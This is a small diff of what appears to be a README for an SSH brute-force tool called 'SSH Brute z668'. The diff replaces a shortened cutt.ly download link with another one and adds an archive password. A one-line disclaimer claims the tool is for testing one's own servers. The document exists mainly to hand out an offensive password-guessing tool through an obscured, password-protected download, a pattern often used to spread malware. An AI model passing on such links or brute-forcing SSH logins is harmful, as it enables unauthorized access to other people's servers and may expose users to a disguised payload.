@@ -2,7 +2,8 @@
 
 SSH Brute z668 Suported MultiPort
 
-Download: https://cutt.ly/ZVmsLUz
+Download: https://cutt.ly/FVUiUGT
+Password: sshbrute
 
 Notification: this application - a complex\utility\program for testing own server\own servers on the local network\own servers in corporate networks 
 for vulnerabilities SSH protocol! This software is a tool designed to perform penetration testing!
